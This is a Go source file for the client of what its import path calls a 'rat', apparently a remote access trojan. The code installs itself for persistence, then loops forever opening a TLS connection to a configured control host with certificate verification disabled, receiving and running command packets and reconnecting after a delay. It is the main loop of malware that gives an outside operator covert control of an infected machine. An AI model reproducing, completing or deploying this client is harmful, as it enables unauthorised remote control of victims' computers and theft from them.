package main

import (
	"crypto/tls"
	"fmt"
	"rat/client/startup"
	"time"
)

func main() {
	err := ParseConfig()
	if err != nil {
		fmt.Println(err.Error())
		return
	}

	err = startup.InstallCurrent(Config.Name)
	if err != nil {
		fmt.Println("Install failed:", err.Error())
	}

	for {
		host := Config.Host
		fmt.Println("Connecting to", host)

		conn, err := tls.Dial("tcp", host, &tls.Config{
			InsecureSkipVerify: true,
		})

		con := Connection{
			Conn: conn,
		}

		if err != nil {
			fmt.Println(err.Error())
			goto end
		}

		Queue = make(chan OutgoingPacket)
		Transfers = make(TransfersMap)

		go func() {
			for {
				packet := <-Queue
				con.WritePacket(packet)
			}
		}()

		con.Init()

		for {
			header, err := con.ReadHeader()

			if err != nil {
				fmt.Println(err.Error())
				con.Close()
				break
			}

			packet := GetIncomingPacket(header)
			err = packet.Read(&con)

			if err != nil {
				fmt.Println(err.Error())
				con.Close()
				break
			}
		}

	end:

		time.Sleep(time.Second * time.Duration(Config.Delay))
	}
}
